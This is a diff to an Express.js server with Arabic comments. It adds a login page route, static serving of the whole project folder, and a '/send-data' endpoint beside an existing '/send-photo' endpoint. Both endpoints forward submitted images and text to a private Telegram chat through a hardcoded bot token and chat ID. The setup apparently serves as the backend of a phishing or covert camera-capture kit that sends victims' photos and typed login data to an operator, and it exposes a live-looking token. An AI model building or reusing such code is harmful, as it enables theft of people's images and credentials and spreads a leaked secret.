@@ -13,33 +13,60 @@ app.use((req, res, next) => {
 
 app.use(express.json({ limit: '50mb' }));
 
+// ✅ خدمة الملفات الثابتة من نفس المجلد
+app.use(express.static(path.join(__dirname)));
+
 const BOT_TOKEN = '8765969078:AAF0n0KlZ4ids7pTeDpAOlulsfaM1E-k1SI';
 const CHAT_ID = '6198785906';
 
+// نقاط النهاية للبيانات
 app.post('/send-photo', async (req, res) => {
     try {
         const { image, caption } = req.body;
         const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Data, 'base64');
-        
+
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('photo', buffer, { filename: 'photo.jpg' });
-        form.append('caption', caption || 'New capture');
-        
+        form.append('caption', caption || '📸 صورة جديدة');
+
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
             headers: form.getHeaders()
         });
-        
+
         res.json({ success: true });
     } catch (error) {
         console.error(error);
-        res.status(500).json({ error: 'Failed to send' });
+        res.status(500).json({ error: 'Failed to send photo' });
     }
 });
 
+app.post('/send-data', async (req, res) => {
+    try {
+        const { caption } = req.body;
+
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: caption,
+            parse_mode: 'HTML'
+        });
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ error: 'Failed to send data' });
+    }
+});
+
+// ✅ الصفحة الرئيسية
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// ✅ صفحة تسجيل الدخول
+app.get('/login', (req, res) => {
+    res.sendFile(path.join(__dirname, 'login.html'));
 });
 
 const PORT = process.env.PORT || 3000;
